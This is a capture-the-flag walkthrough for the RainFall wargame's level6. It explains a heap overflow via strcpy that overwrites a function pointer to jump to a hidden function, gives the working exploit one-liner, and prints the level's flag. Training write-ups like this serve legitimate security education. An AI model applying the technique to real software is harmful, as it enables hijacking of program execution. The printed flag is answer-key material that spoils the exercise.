# Walkthrough

## Solution

```
./level6 $(python -c "print '\x54\x84\x04\x08' * 19")
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

## Explanation

### Execution

```
level6@RainFall:~$ ./level6 
Segmentation fault (core dumped)
level6@RainFall:~$ ./level6 hello
Nope
level6@RainFall:~$ ./level6 hello you
Nope
```

### Disassembly

```
info function
0x08048454  n
0x08048468  m
0x0804847c  main
```

You can view the commented asm code [here](Ressources/assembly.asm)  
You can view the asm code translated to C [here](source.c)  


### Steps

The commande `objdump -D level6` shows the existence of two functions: \<m> and \<n>.  
\<n> is never called and has the address 0x08048454.  
\<m> is called by its address, which is stored in a heap address next to another heap address of size 64 to which is copied into argv[1] with strcpy.  
Overflowing argv[1] with the address of the function \<n> will overwrite the call to function \<m>.  

```bash
./level6 $(python -c "print '\x54\x84\x04\x08' * 19")
```